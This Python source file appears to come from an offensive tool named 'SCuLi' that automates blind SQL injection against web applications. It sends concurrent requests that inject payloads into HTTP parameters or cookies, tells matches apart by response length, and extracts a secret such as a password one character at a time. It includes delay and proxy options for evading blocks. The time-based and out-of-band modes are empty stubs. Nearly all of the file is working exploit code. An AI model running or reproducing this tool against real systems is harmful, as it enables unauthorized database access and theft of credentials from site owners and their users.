from urllib.parse import urlencode
import code.utils as utils
import asyncio
import aiohttp
import time
import json


def process_time(URL: str, METHOD: str, ENGINE: str) -> int:
    return 1


def process_OAST(URL: str, METHOD: str, ENGINE: str) -> int:
    return 1


def process_custom(URL: str, METHOD: str, ENGINE: str) -> int:
    return 1


def process_basic(URL: str, METHOD: str, ENGINE: str, TYPE: str) -> int:
    payload_0 = utils.get_payload(TYPE, ENGINE)
    SCuLi = utils.SQLi()
    if not utils.ARGS.input:
        SCuLi = utils.init_SQLi(SCuLi)
    else:
        print("[info] Hello Sir. All the job was made for you. Enjoy your meal my lord.")
        with open(utils.ARGS.input, "r") as in_file:
            in_json = in_file.read()
            in_SCuLi = json.loads(in_json)
            SCuLi.HTTP_params = in_SCuLi["HTTP_params"]
            SCuLi.injection = in_SCuLi["injection"]
            if "options" in in_SCuLi:
                SCuLi.options = in_SCuLi["options"]
    payload_1 = utils.adapt_payload(SCuLi, payload_0)

    # Find which param is the sqli
    if not SCuLi.options["SQLi_in_cookie"]:
        sqli_key = ""
        for key, value in SCuLi.HTTP_params.items():
            if "<>" in value:
                sqli_key = key
                break

    print(f"[info] Payload is ready: `{payload_1}`")
    print("[info] If SCuLi is blocked during process: add some `--delay`.")
    utils.countdown()
    total_start = time.time()

    exfiltred_data = ""
    max_len_password = 32
    if SCuLi.options["SQLi_in_cookie"]:
        for index in range(max_len_password):
            payload_2 = payload_1.replace('$index', str(index+1))
            arr_cookies = []
            for c in utils.ALPHABET:
                cookie = SCuLi.options["SQLi_in_cookie"].replace("<>", payload_2.replace("$char", c))
                arr_cookies.append(cookie)
            exfiltred = asyncio.run(prepare_async_requests(URL, METHOD, SCuLi.HTTP_params, arr_cookies))
            utils.QUERY_COUNT += len(utils.ALPHABET)
            if exfiltred:
                exfiltred_data += exfiltred
                print(f"[info] Char {index+1} found: `{exfiltred}` => `{exfiltred_data}`")
                if utils.ARGS.delay:
                    time.sleep(float(utils.ARGS.delay))
            else:
                break
    else:
        data = SCuLi.HTTP_params.copy()
        for index in range(max_len_password):
            payload_2 = payload_1.replace('$index', str(index+1))
            arr_query = []
            for c in utils.ALPHABET:
                data[sqli_key] = SCuLi.HTTP_params[sqli_key].replace("<>", payload_2.replace('$char', c))
                arr_query.append(data.copy())
            exfiltred = asyncio.run(prepare_async_requests(URL, METHOD, utils.ARGS.cookie, arr_query))
            utils.QUERY_COUNT += len(utils.ALPHABET)
            if exfiltred:
                exfiltred_data += exfiltred
                print(f"[info] Char {index} found: `{exfiltred}` => `{exfiltred_data}`")
                if utils.ARGS.delay:
                    time.sleep(float(utils.ARGS.delay))
            else:
                break
    utils.TIMING = round(time.time() - total_start, 2)
    return exfiltred_data


async def send_async_request(session, URL: str, METHOD: str, cookie: str, data: dict) -> int:
    cookie = "" if not cookie else cookie
    full_url = URL
    encoded_data = urlencode(data)
    if METHOD == "GET":
        full_url = f"{URL}?{encoded_data}"
        request = session.get(full_url, headers={'Cookie': cookie}, proxy=utils.ARGS.proxy)
    elif METHOD == "POST":
        request = session.post(full_url, data=data, headers={'Cookie': cookie}, proxy=utils.ARGS.proxy)
    async with request as response:
        if response.status in range(400, 499) or response.status == 504:
            return request, response.status
        else:
            request = {
                "method": response.request_info.method,
                "url": full_url,
                "headers": dict(response.request_info.headers),
                "data": encoded_data if METHOD == "POST" else "",
            }
            response = {
                "status": response.status,
                "headers": dict(response.headers),
                "data": await response.text(),
            }
            return request, response


async def prepare_async_requests(URL: str, METHOD: str, static_data, injected_arr: list) -> str:
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
        if not static_data or isinstance(static_data, str):
            # SQLi in HTTP parameters
            cookie = static_data
            tasks = [send_async_request(session, URL, METHOD, cookie, query) for query in injected_arr]
        else:
            # SQLi in cookies
            http_params = static_data
            tasks = [send_async_request(session, URL, METHOD, cookie, http_params) for cookie in injected_arr]

        tasks_output = await asyncio.gather(*tasks)
        arr_requests, arr_responses = list(zip(*tasks_output))
        if isinstance(arr_responses[0], int):
            print(f"[error] SCuLi was unable to connect to {URL} => HTTP status = {arr_responses[0]}")
            return None

        arr_len_responses = [len(response['data']) for response in arr_responses]
        reference = utils.select_reference_len(arr_len_responses)
        for idx, len_resp in enumerate(arr_len_responses):
            if len_resp != reference:
                return utils.ALPHABET[idx]
        if utils.QUERY_COUNT <= len(utils.ALPHABET):
            # We still on first char which means there is a problem in the query
            print("[warning] Nothing matched query infos:")
            print(f"HTTP Request: `\n{utils.print_request(arr_requests[0])}`")
            print("\n-------\n")
            print(f"HTTP Response: `\n{utils.print_response(arr_responses[0])}`")
    return None
